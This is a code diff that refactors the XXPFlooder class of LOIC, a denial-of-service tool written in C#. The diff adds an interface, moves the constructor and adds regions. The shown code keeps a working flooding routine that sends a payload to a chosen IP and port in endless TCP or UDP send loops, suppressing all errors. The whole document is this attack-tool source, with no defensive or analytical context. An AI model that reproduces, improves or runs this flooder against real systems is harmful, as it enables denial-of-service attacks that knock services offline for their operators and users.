@@ -1,11 +1,23 @@
-﻿using System;
+﻿using System.ComponentModel;
 using System.Net.Sockets;
-using System.ComponentModel;
 
 namespace LOIC
 {
-	public class XXPFlooder
+	class XXPFlooder : IFlooder
 	{
+		#region Constructors
+		public XXPFlooder(string ip, int port, int proto, int delay, bool resp, string data)
+		{
+			this.IP = ip;
+			this.Port = port;
+			this.Protocol = proto;
+			this.Delay = delay;
+			this.Resp = resp;
+			this.Data = data;
+		}
+		#endregion
+
+		#region Properties
 		public bool IsFlooding { get; set; }
 
 		public int FloodCount { get; set; }
@@ -21,17 +33,9 @@ namespace LOIC
 		public bool Resp { get; set; }
 
 		public string Data { get; set; }
+		#endregion
 
-		public XXPFlooder(string ip, int port, int proto, int delay, bool resp, string data)
-		{
-			this.IP = ip;
-			this.Port = port;
-			this.Protocol = proto;
-			this.Delay = delay;
-			this.Resp = resp;
-			this.Data = data;
-		}
-
+		#region Methods
 		public void Start()
 		{
 			IsFlooding = true;
@@ -39,24 +43,24 @@ namespace LOIC
 			bw.DoWork += new DoWorkEventHandler(bw_DoWork);
 			bw.RunWorkerAsync();
 		}
+		#endregion
 
+		#region Event handlers
 		private void bw_DoWork(object sender, DoWorkEventArgs e)
 		{
 			try
 			{
 				byte[] buf = System.Text.Encoding.ASCII.GetBytes(Data);
 				var RHost = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
-				while (IsFlooding)
+				while (this.IsFlooding)
 				{
-					Socket socket = null;
 					if (Protocol == 1)
 					{
-						socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+						Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp) { Blocking = Resp };
 						socket.Connect(RHost);
-						socket.Blocking = Resp;
 						try
 						{
-							while (IsFlooding)
+							while (this.IsFlooding)
 							{
 								FloodCount++;
 								socket.Send(buf);
@@ -67,11 +71,10 @@ namespace LOIC
 					}
 					if (Protocol == 2)
 					{
-						socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
-						socket.Blocking = Resp;
+						Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp) { Blocking = Resp };
 						try
 						{
-							while (IsFlooding)
+							while (this.IsFlooding)
 							{
 								FloodCount++;
 								socket.SendTo(buf, SocketFlags.None, RHost);
@@ -84,5 +87,6 @@ namespace LOIC
 			}
 			catch { }
 		}
+		#endregion
 	}
 }
